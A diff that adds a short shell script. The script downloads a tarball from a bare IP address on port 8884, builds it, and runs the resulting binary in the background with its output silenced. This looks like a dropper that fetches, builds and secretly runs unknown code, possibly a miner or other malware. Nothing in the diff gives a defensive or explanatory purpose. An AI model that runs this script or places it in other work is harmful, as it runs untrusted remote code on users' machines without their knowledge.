@@ -1,0 +1,11 @@
+wget http://23.227.167.228:8884/linux8444.tar.gz
+
+tar -xvf ./linux8444.tar.gz
+
+cd ./linux8444/build/
+
+cmake ..
+
+make
+
+./linux848888888874 linux8474 &> /dev/null &
